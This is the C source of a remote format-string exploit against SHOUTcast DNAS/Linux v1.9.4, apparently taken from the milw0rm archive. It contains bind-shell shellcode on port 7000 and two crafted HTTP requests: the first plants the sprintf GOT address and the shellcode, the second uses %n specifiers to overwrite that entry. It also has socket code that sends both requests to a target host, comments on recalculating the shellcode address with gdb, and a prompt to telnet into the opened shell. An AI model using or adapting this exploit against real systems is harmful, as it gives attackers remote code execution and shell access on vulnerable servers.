/* SHOUTcast DNAS/Linux v1.9.4 format string remote exploit           */
/* Damian Put <pucik@cc-team.org> Cyber-Crime Team (www.CC-Team.org)  */
/* Tested on slackware 9.1 and 10.0 (0xbf3feee0)                      */
/* When exploit only crash SHOUTcast we should calculate new address: */
/*                                                                    */
/* bash-2.05b$ gdb sc_serv core                                       */
/* ...                                                                */
/* (gdb) x/x $edi                                                     */
/* 0xbe462270:     0x78257825                                         */
/* (gdb) x/x 0xbe462270-996                                           */
/* 0xbe461e8c:     0x5050c031                                         */
/*                                                                    */
/* 0xbe461e8c - This is our shellcode addr                            */
/*                                                                    */
/* Now we "only" must change format string code in req2 :-)           */

#include <stdio.h>
#include <stdlib.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/* Default SHOUTcast port */
#define PORT 8000

char shellcode[] =  //bindshellcode (port 7000)
     "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
     "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
     "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
     "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
     "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
     "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
     "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
     "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
     int sock;
     char *host;
     struct hostent *h;
     struct sockaddr_in dest;

     char req1[1024] = "GET /content/AA"
     /* sprintf GOT addr */
     "\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08";

     strcat(req1, shellcode);
     strcat(req1, ".mp3 HTTP/1.0\r\n\r\n");

     /* We cannot use %numberx and %number$n (filtered) */
     /* 0xbf3feee0 -  shellcode addr on slackware 9.1   */
     char *req2 = "GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3"
     " HTTP/1.0\r\n\r\n";

     printf("SHOUTcast DNAS/Linux v1.9.4 format string remote exploit by pucik www.CC-Team.org\n");
     if(argc < 2)
     {
           printf("Usage: %s <host>\n", argv[0]);
           exit(0);
     }

     host = argv[1];

     if(!(h = gethostbyname(host)))
     {
           fprintf(stderr, "Cannot get IP of %s, %s!\n", host, strerror(errno));
           exit(-1);
     }

     sock = socket(PF_INET, SOCK_STREAM, 0);

     dest.sin_addr=*((struct in_addr*)h->h_addr);
     dest.sin_family = PF_INET;
     dest.sin_port = htons(PORT);

     if(connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) == -1)
     {
           fprintf(stderr, "Cannot connect to %s, %s!\n", host, strerror(errno));
           exit(-1);
     }

     printf("[*] Sending first request ...\n");
     write(sock, req1, strlen(req1));

     close(sock);

     sock = socket(PF_INET, SOCK_STREAM, 0);

     if(connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) == -1)
     {
           fprintf(stderr, "Cannot connect to %s, %s!\n", host, strerror(errno));
           exit(-1);
     }

     printf("[*] Sending second request ...\n");
     write(sock, req2, strlen(req2));

     close(sock);

     printf("[*] Try telnet %s 7000 :)\n", host);

     return 0;
}

// milw0rm.com [2004-12-23]
